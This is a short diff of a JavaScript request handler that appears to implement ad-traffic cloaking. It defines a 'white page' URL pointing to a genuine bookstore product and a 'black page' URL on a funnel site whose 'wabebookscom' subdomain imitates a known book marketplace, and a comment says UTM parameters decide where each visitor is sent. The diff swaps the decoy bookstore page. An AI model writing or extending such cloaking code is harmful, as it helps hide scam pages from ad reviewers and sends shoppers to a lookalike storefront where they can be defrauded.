@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.books2door.com/products/the-kindness-method-by-shahroo-izadi-the-highly-effective-and-extremely-enjoyable-way-to-change-your-habits-non-fiction-paperback";
+    const whitePageURL = "https://www.bookinabox.dk/produkt/broken-souls-and-bones-forudbestilling/";
     const blackPageURL = "https://wabebookscom.myfunnelish.com/cshhhhhn-1747502439037021";
   
     // Parse the UTM parameters from the request URL
